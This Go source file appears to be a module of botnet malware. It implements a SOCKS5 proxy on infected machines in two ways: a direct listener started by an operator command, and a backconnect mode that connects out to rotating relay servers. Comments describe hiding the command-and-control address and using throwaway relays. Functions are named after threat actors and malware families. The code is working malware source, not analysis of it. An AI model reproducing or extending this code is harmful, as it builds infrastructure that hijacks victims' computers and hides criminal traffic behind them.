package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// ============================================================================
// BACKCONNECT SOCKS5 PROXY
//
// Instead of opening a local listener (which exposes the bot), the bot
// connects OUT to a relay server. The relay accepts SOCKS5 clients on its
// public port and bridges them through to the bot via backconnect tunnels.
// The bot runs the full SOCKS5 protocol over each tunnel.
//
// Flow:
//   Client → [SOCKS5] → Relay ←──[backconnect TLS]──← Bot → Target
//
// Multiple relay endpoints are supported. On reconnect the bot rotates
// through all configured relays, falling back to the next one when the
// current one is unreachable. The order is shuffled on startup so
// different bots spread across relays.
//
// Benefits:
//   - Bot never opens an inbound port
//   - C2 address is not exposed (relay is separate infrastructure)
//   - Relay can be on a throwaway VPS
//   - Automatic failover across multiple relays
// ============================================================================

// activeRelay stores the relay address that cozyBear is currently connected to
// so that fancyBear can open data connections to the same relay.
// Protected by lazarusMutex.
var activeRelay string

// muddywater starts a backconnect SOCKS5 session to one or more relay servers.
// The bot connects OUT to the first reachable relay and waits for client sessions.
// On disconnect it rotates to the next relay in the list.
// Parameters:
//   - relays: One or more relay addresses in host:port format
//   - c2Conn: C2 connection (unused, kept for interface consistency)
//
// Returns: error if already running or no valid addresses
func muddywater(relays []string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS backconnect already running")
	}
	// Validate at least one address
	valid := make([]string, 0, len(relays))
	for _, r := range relays {
		if _, _, err := scarcruft(r); err == nil {
			valid = append(valid, r)
		}
	}
	if len(valid) == 0 {
		return fmt.Errorf("no valid relay addresses")
	}
	lazarusActive = true
	lazarusStopCh = make(chan struct{})
	atomic.StoreInt32(&lazarusCount, 0)
	go cozyBear(valid)
	return nil
}

// emotet stops the SOCKS5 proxy (both direct and backconnect modes).
func emotet() {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive && lazarusStopCh != nil {
		close(lazarusStopCh)
	}
	if lazarusListener != nil {
		lazarusListener.Close()
		lazarusListener = nil
	}
	lazarusActive = false
	activeRelay = ""
}

// ============================================================================
// DIRECT MODE — local SOCKS5 listener (no relay needed)
// Used when operator sends !socks <port> (just a port number).
// Bot opens a SOCKS5 listener directly on 0.0.0.0:<port>.
// ============================================================================

// lazarusListener holds the direct-mode TCP listener (nil in backconnect mode).
var lazarusListener net.Listener

// turmoil starts a direct SOCKS5 proxy listener on the specified port.
func turmoil(port string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS proxy already running")
	}
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		return fmt.Errorf("invalid port: %s", port)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to bind: %v", err)
	}
	lazarusListener = listener
	lazarusActive = true
	lazarusStopCh = make(chan struct{})
	atomic.StoreInt32(&lazarusCount, 0)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				select {
				case <-lazarusStopCh:
					return
				default:
					continue
				}
			}
			if atomic.LoadInt32(&lazarusCount) >= maxSessions {
				conn.Close()
				continue
			}
			atomic.AddInt32(&lazarusCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&lazarusCount, -1)
				trickbot(c)
			}(conn)
		}
	}()
	return nil
}

// ============================================================================
// BACKCONNECT MODE — bot connects OUT to relay
// ============================================================================

// cozyBear maintains the backconnect control connection to the relay pool.
// Authenticates with syncToken, then waits for RELAY_NEW signals.
// On disconnect, rotates to the next relay in the list.
// Shuffles order initially so bots spread across relays.
func cozyBear(relays []string) {
	// Shuffle so different bots hit different relays first
	shuffled := make([]string, len(relays))
	copy(shuffled, relays)
	rand.Shuffle(len(shuffled), func(i, j int) {
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	})

	idx := 0           // current position in shuffled list
	consecutive := 0   // consecutive failures across full rotation
	backoff := 5 * time.Second

	for {
		select {
		case <-lazarusStopCh:
			deoxys("cozyBear: Stop signal received, exiting")
			return
		default:
		}

		relayAddr := shuffled[idx%len(shuffled)]
		host, port, _ := scarcruft(relayAddr)

		deoxys("cozyBear: Trying relay %s (%d/%d)", relayAddr, (idx%len(shuffled))+1, len(shuffled))
		conn, err := gamaredon(host, port)
		if err != nil {
			deoxys("cozyBear: Relay %s failed: %v", relayAddr, err)
			idx++
			consecutive++
			// If we've failed a full rotation, backoff before retrying
			if consecutive >= len(shuffled) {
				consecutive = 0
				deoxys("cozyBear: All %d relays failed, backing off %v", len(shuffled), backoff)
				select {
				case <-lazarusStopCh:
					return
				case <-time.After(backoff):
				}
				// Increase backoff up to 60s
				if backoff < 60*time.Second {
					backoff = backoff * 2
					if backoff > 60*time.Second {
						backoff = 60 * time.Second
					}
				}
			} else {
				// Quick retry on next relay (small jitter)
				select {
				case <-lazarusStopCh:
					return
				case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
				}
			}
			continue
		}

		// Connected — reset backoff
		consecutive = 0
		backoff = 5 * time.Second

		// Authenticate with relay
		authLine := fmt.Sprintf("RELAY_AUTH:%s:%s\n", syncToken, cachedBotID)
		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
		if _, err := conn.Write([]byte(authLine)); err != nil {
			conn.Close()
			idx++
			continue
		}
		conn.SetWriteDeadline(time.Time{})

		reader := bufio.NewReader(conn)
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		resp, err := reader.ReadString('\n')
		if err != nil || strings.TrimSpace(resp) != "RELAY_OK" {
			deoxys("cozyBear: Relay %s auth rejected", relayAddr)
			conn.Close()
			idx++
			continue
		}
		conn.SetReadDeadline(time.Time{})
		deoxys("cozyBear: Authenticated with relay %s", relayAddr)

		// Store active relay so fancyBear knows where to open data connections
		lazarusMutex.Lock()
		activeRelay = relayAddr
		lazarusMutex.Unlock()

		// Keepalive writer — sends periodic pings so relay detects us
		keepaliveDone := make(chan struct{})
		go func() {
			defer close(keepaliveDone)
			ticker := time.NewTicker(60 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-lazarusStopCh:
					conn.Close()
					return
				case <-ticker.C:
					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
					if _, err := conn.Write([]byte("RELAY_PING\n")); err != nil {
						conn.Close()
						return
					}
					conn.SetWriteDeadline(time.Time{})
				}
			}
		}()

		// Read loop — wait for RELAY_NEW signals from relay
		for {
			conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
			line, err := reader.ReadString('\n')
			if err != nil {
				deoxys("cozyBear: Control read error on %s: %v", relayAddr, err)
				break
			}
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "RELAY_NEW:") {
				sessionID := strings.TrimPrefix(line, "RELAY_NEW:")
				if atomic.LoadInt32(&lazarusCount) < maxSessions {
					atomic.AddInt32(&lazarusCount, 1)
					go fancyBear(relayAddr, sessionID)
				}
			}
		}

		conn.Close()
		<-keepaliveDone

		lazarusMutex.Lock()
		activeRelay = ""
		lazarusMutex.Unlock()

		// Move to next relay on disconnect
		idx++
		deoxys("cozyBear: Disconnected from %s, rotating to next relay", relayAddr)

		select {
		case <-lazarusStopCh:
			return
		case <-time.After(time.Duration(1000+rand.Intn(2000)) * time.Millisecond):
		}
	}
}

// fancyBear opens a data connection to the relay for a single SOCKS5 session.
// Sends the session ID, then runs the full SOCKS5 protocol (trickbot).
func fancyBear(relayAddr, sessionID string) {
	defer atomic.AddInt32(&lazarusCount, -1)

	host, port, err := scarcruft(relayAddr)
	if err != nil {
		return
	}

	conn, err := gamaredon(host, port)
	if err != nil {
		deoxys("fancyBear: Data connection failed: %v", err)
		return
	}

	// Identify as data channel
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write([]byte("RELAY_DATA:" + sessionID + "\n")); err != nil {
		conn.Close()
		return
	}
	conn.SetWriteDeadline(time.Time{})

	deoxys("fancyBear: Data channel established for session %s", sessionID)

	// Run SOCKS5 protocol — from the bot's perspective this is just
	// a regular SOCKS5 client connection tunneled through the relay
	trickbot(conn)
}

// trickbot handles a single SOCKS5 client connection.
// Implements SOCKS5 protocol: version negotiation -> auth -> connection request -> relay.
// Supports address types: IPv4 (0x01), domain (0x03), IPv6 (0x04)
// Parameters:
//   - clientConn: SOCKS5 client connection (direct or via relay tunnel)
func trickbot(clientConn net.Conn) {
	defer clientConn.Close()
	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 513)
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	socksCredsMutex.RLock()
	currentUser := proxyUser
	currentPass := proxyPass
	socksCredsMutex.RUnlock()
	requireAuth := currentUser != "" && currentPass != ""
	if requireAuth {
		// Check if client supports username/password auth (method 0x02)
		methodCount := int(buf[1])
		supportsAuth := false
		for i := 0; i < methodCount && i+2 < n; i++ {
			if buf[2+i] == 0x02 {
				supportsAuth = true
				break
			}
		}
		if !supportsAuth {
			clientConn.Write([]byte{0x05, 0xFF}) // no acceptable methods
			return
		}
		clientConn.Write([]byte{0x05, 0x02}) // select username/password auth

		// Read RFC 1929 sub-negotiation: VER(0x01) | ULEN | UNAME | PLEN | PASSWD
		n, err = clientConn.Read(buf)
		if err != nil || n < 2 || buf[0] != 0x01 {
			return
		}
		ulen := int(buf[1])
		if ulen == 0 || n < 2+ulen+1 {
			clientConn.Write([]byte{0x01, 0x01}) // auth failure
			return
		}
		username := string(buf[2 : 2+ulen])
		plen := int(buf[2+ulen])
		if plen == 0 || n < 3+ulen+plen {
			clientConn.Write([]byte{0x01, 0x01})
			return
		}
		password := string(buf[3+ulen : 3+ulen+plen])

		if username != currentUser || password != currentPass {
			clientConn.Write([]byte{0x01, 0x01}) // auth failure
			return
		}
		clientConn.Write([]byte{0x01, 0x00}) // auth success
	} else {
		clientConn.Write([]byte{0x05, 0x00}) // no auth required
	}
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	addrType := buf[3]
	var targetAddr string
	var targetPort uint16
	switch addrType {
	case 0x01:
		if n < 10 {
			return
		}
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04:
		if n < 22 {
			return
		}
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	ip4 := localAddr.IP.To4()
	if ip4 == nil {
		ip4 = net.IPv4(0, 0, 0, 0)
	}
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, ip4...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)
	clientConn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(targetConn, clientConn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, targetConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	<-done
	<-done
}
